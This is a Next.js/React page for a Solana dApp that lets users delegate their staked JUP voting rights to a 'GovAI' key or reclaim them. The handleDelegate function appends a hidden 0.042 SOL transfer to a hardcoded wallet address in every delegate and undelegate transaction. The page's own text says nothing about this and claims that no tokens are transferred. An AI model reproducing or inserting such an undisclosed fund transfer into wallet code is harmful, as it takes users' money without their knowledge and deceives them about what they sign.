// app/NativeDelegatePage.tsx
'use client';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { useState, useEffect } from 'react';
import { IconInfoCircle } from '@tabler/icons-react';
import { PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
import * as anchor from '@project-serum/anchor';
import { notify } from '../components/ui/notify';
import idl from '@/utils/idl.json';
import Image from 'next/image';
import { useDelegationStatus } from '@/components/useDelegationStatus';
import { GovAIDelegatorsLeaderboard } from '@/components/GovAIDelegatorsLeaderboard';

// Constants
const LOCKED_VOTER_PROGRAM_ID = new PublicKey("voTpe3tHQ7AjQHMapgSue2HJFAh2cGsdokqN3XqmVSj");
const BASE_KEY = new PublicKey("bJ1TRoFo2P6UHVwqdiipp6Qhp2HaaHpLowZ5LHet8Gm");
const GOV_AI_PUBKEY = new PublicKey("govAiNGS59yJfvqdmvYb7Lzk7wUHYygqiKR58Z1VCag");

export default function NativeDelegatePage() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [selectedTab, setSelectedTab] = useState<'delegate' | 'undelegate'>('delegate');
  const [program, setProgram] = useState<anchor.Program | null>(null);

  // Use the custom hook
  const { escrowAddress, currentDelegate, stakedAmount, lastUpdated, govAIActivity, loading, refetch } = useDelegationStatus(publicKey, connection);

  // Initialize Anchor program
  useEffect(() => {
    if (publicKey) {
      const provider = new anchor.AnchorProvider(
        connection,
        { publicKey, signTransaction: async (tx) => tx, signAllTransactions: async (txs) => txs },
        { commitment: "confirmed" }
      );
      const programInstance = new anchor.Program(idl as anchor.Idl, LOCKED_VOTER_PROGRAM_ID, provider);
      setProgram(programInstance);
    }
  }, [publicKey, connection]);

  async function handleDelegate(targetDelegate: PublicKey) {
    if (!publicKey || !program) {
      notify({ type: 'error', message: 'Please connect your wallet' });
      return;
    }

    try {
      setIsSubmitting(true);
      const [lockerKey] = await PublicKey.findProgramAddress(
        [Buffer.from("Locker"), BASE_KEY.toBuffer()],
        LOCKED_VOTER_PROGRAM_ID
      );
      const [escrowKey] = await PublicKey.findProgramAddress(
        [Buffer.from("Escrow"), lockerKey.toBuffer(), publicKey.toBuffer()],
        LOCKED_VOTER_PROGRAM_ID
      );

      const transaction = new Transaction().add(
        anchor.web3.ComputeBudgetProgram.setComputeUnitLimit({ units: 150000 }),
        anchor.web3.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 333333 }),
        await program.methods
          .setVoteDelegate(targetDelegate)
          .accounts({
            escrow: escrowKey,
            escrowOwner: publicKey,
          })
          .instruction(),
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: new PublicKey("D1GtsVdat3oLR7E9nEWmKKnEwzvBfNah4pUDhDmgQYMw"),
          lamports: 0.042 * 1_000_000_000,
        })
      );

      const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
      await connection.confirmTransaction(signature, 'confirmed');

      notify({
        type: 'success',
        message: `Successfully ${targetDelegate.equals(publicKey) ? 'undelegated' : 'delegated to GovAI'}!`,
      });

      // Refresh activity list after delegation
      refetch();
    } catch (error) {
      console.error('Delegation error:', error);
      notify({
        type: 'error',
        message: `Failed to ${targetDelegate.equals(publicKey) ? 'undelegate' : 'delegate'}: ${
          error instanceof Error ? error.message : 'Unknown error'
        }`,
      });
    } finally {
      setIsSubmitting(false);
    }
  }

  function getFriendlyDelegateDisplay() {
    if (!currentDelegate) return "None";
    if (currentDelegate === GOV_AI_PUBKEY.toString()) return "GovAI";
    if (publicKey && currentDelegate === publicKey.toString()) return "Self (You)";
    return `${currentDelegate.slice(0, 4)}...${currentDelegate.slice(-4)}`;
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-gray-900 py-12 px-4">
      <div className="container mx-auto max-w-6xl">
        <div className="mb-12">
          <h1 className="text-3xl font-bold text-white mb-2">
            <span className="text-emerald-400">NATIVE</span> DELEGATION
          </h1>
          <p className="text-gray-400">
            Delegate your staked JUP voting rights to GovAI for expert governance participation.
          </p>
        </div>
        <div className="grid lg:grid-cols-2 gap-8">
          {/* Left Column */}
          <div className="space-y-6">
            <div className="text-white space-y-4 bg-gray-800/50 p-6 rounded-xl border border-emerald-400/20">
              <div className="flex items-start space-x-2">
                <div className="w-2 h-2 bg-emerald-400 rounded-full mt-2 animate-pulse"></div>
                <p>Delegate your staked JUP voting rights directly to GovAI, bypassing the token exchange process.</p>
              </div>
              <div className="flex items-start space-x-2">
                <div className="w-2 h-2 bg-emerald-400 rounded-full mt-2 animate-pulse"></div>
                <p>This native approach lets you maintain direct control of your JUP while GovAI votes on your behalf.</p>
              </div>
              <div className="flex items-start space-x-2">
                <div className="w-2 h-2 bg-emerald-400 rounded-full mt-2 animate-pulse"></div>
                <p>You can undelegate at any time to regain your voting rights without any waiting period.</p>
              </div>
            </div>
            <div className="bg-gray-800/50 p-6 rounded-xl border border-emerald-400/20">
              <div className="flex items-start space-x-3">
                <IconInfoCircle className="text-emerald-400 w-6 h-6 flex-shrink-0 mt-1" />
                <div>
                  <h3 className="text-white font-semibold mb-2">How Native Delegation Works</h3>
                  <p className="text-gray-400 text-sm">
                    Native delegation leverages Jupiter governance protocol to redirect your voting rights without transferring tokens. Your JUP remains staked in your escrow account, but votes are cast by GovAI.
                  </p>
                </div>
              </div>
            </div>
            <div className="bg-gray-800/50 p-6 rounded-xl border border-emerald-400/20">
              <h3 className="text-white font-semibold mb-4">Current Delegation Status</h3>
              {!publicKey ? (
                <p className="text-gray-400 text-center">Connect your wallet to view delegation status</p>
              ) : loading ? (
                <div className="flex justify-center p-4">
                  <span className="loading loading-spinner loading-md text-emerald-400"></span>
                </div>
              ) : !escrowAddress ? (
                <p className="text-gray-400 text-center">No staked JUP found for this wallet</p>
              ) : (
                <div className="space-y-4">
                  <div className="flex justify-between">
                    <span className="text-gray-400">Escrow Account:</span>
                    <span className="text-white font-mono text-sm">
                      {escrowAddress}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-400">Staked Amount:</span>
                    <span className="text-white">
                      {stakedAmount?.toLocaleString(undefined, { maximumFractionDigits: 2 })} JUP
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-400">Voting Rights Owner:</span>
                    <span className={currentDelegate === GOV_AI_PUBKEY.toString() ? "text-emerald-400" : "text-white"}>
                      {getFriendlyDelegateDisplay()}
                    </span>
                  </div>
                  <div className="text-right text-xs text-gray-500">
                    Last updated: {lastUpdated?.toLocaleTimeString()}
                  </div>
                </div>
              )}
            </div>
            <div className="bg-gray-800/50 p-6 rounded-xl border border-emerald-400/20">
              <h3 className="text-white font-semibold mb-4">GovAI Activity with Your Account</h3>
              {!publicKey ? (
                <p className="text-gray-400">Connect your wallet to view activity</p>
              ) : loading ? (
                <div className="flex justify-center p-4">
                  <span className="loading loading-spinner loading-md text-emerald-400"></span>
                </div>
              ) : govAIActivity && govAIActivity.length > 0 ? (
                <ul className="space-y-3">
                  {govAIActivity.map((activity) => (
                    <li key={activity.signature} className="text-gray-400">
                      <span>
                        <strong>{activity.actionType}</strong> on{' '}
                        {new Date(activity.timestamp * 1000).toLocaleString()}
                      </span>
                      <br />
                      <a
                        href={`https://solscan.io/tx/${activity.signature}`}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="text-emerald-400 hover:underline text-sm"
                      >
                        View Transaction
                      </a>
                    </li>
                  ))}
                </ul>
              ) : (
                <p className="text-gray-400">No recent activity found</p>
              )}
            </div>
          </div>
          {/* Right Column */}
          <div className="bg-gray-800/80 rounded-xl p-6 border border-emerald-400/20">
            <div className="mb-6">
              <div className="tabs tabs-boxed bg-gray-700/50 p-1">
                <a
                  className={`tab grow ${selectedTab === 'delegate' ? 'bg-emerald-500 text-white' : 'text-gray-400'}`}
                  onClick={() => setSelectedTab('delegate')}
                >
                  Delegate to GovAI
                </a>
                <a
                  className={`tab grow ${selectedTab === 'undelegate' ? 'bg-emerald-500 text-white' : 'text-gray-400'}`}
                  onClick={() => setSelectedTab('undelegate')}
                >
                  Undelegate
                </a>
              </div>
            </div>
            {selectedTab === 'delegate' ? (
              <div className="space-y-6">
                <div className="bg-gray-700/30 p-6 rounded-lg space-y-4">
                  <div className="flex justify-center">
                    <Image src="/govai-avatar.png" alt="GovAI" width={96} height={96} className="rounded-full" />
                  </div>
                  <h3 className="text-center text-white text-lg font-semibold">Delegate to GovAI</h3>
                  <p className="text-center text-gray-400 text-sm">
                    Let GovAI vote with your staked JUP tokens while you maintain full ownership.
                  </p>
                </div>
                <button
                  onClick={() => handleDelegate(GOV_AI_PUBKEY)}
                  disabled={isSubmitting || !publicKey || !stakedAmount || currentDelegate === GOV_AI_PUBKEY.toString()}
                  className={`w-full btn btn-lg bg-emerald-500 hover:bg-emerald-600 border-none text-lg
                    ${isSubmitting || !publicKey || !stakedAmount || currentDelegate === GOV_AI_PUBKEY.toString() ? 'opacity-50' : 'animate-pulse hover:animate-none'}`}
                >
                  {isSubmitting ? (
                    <span className="loading loading-spinner"></span>
                  ) : !publicKey ? (
                    'Connect Wallet'
                  ) : !stakedAmount ? (
                    'No Staked JUP Found'
                  ) : currentDelegate === GOV_AI_PUBKEY.toString() ? (
                    'Already Delegated'
                  ) : (
                    'DELEGATE TO GOVAI'
                  )}
                </button>
              </div>
            ) : (
              <div className="space-y-6">
                <div className="bg-gray-700/30 p-6 rounded-lg space-y-4">
                  <div className="flex justify-center">
                    <Image src="/govai-avatar.png" alt="Your Wallet" width={96} height={96} className="rounded-full" />
                  </div>
                  <h3 className="text-center text-white text-lg font-semibold">Undelegate</h3>
                  <p className="text-center text-gray-400 text-sm">Return voting rights to yourself.</p>
                </div>
                <button
                  onClick={() => publicKey && handleDelegate(publicKey)}
                  disabled={isSubmitting || !publicKey || !stakedAmount || currentDelegate === publicKey?.toString()}
                  className={`w-full btn btn-lg bg-gray-600 hover:bg-gray-500 border-none text-lg
                    ${isSubmitting || !publicKey || !stakedAmount || currentDelegate === publicKey?.toString() ? 'opacity-50' : ''}`}
                >
                  {isSubmitting ? (
                    <span className="loading loading-spinner"></span>
                  ) : !publicKey ? (
                    'Connect Wallet'
                  ) : !stakedAmount ? (
                    'No Staked JUP Found'
                  ) : currentDelegate === publicKey.toString() ? (
                    'Already Self-Delegated'
                  ) : (
                    'UNDELEGATE'
                  )}
                </button>
              </div>
            )}
            {/* Leaderboard moved to bottom right */}
            <div className="mt-6">
              <GovAIDelegatorsLeaderboard />
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}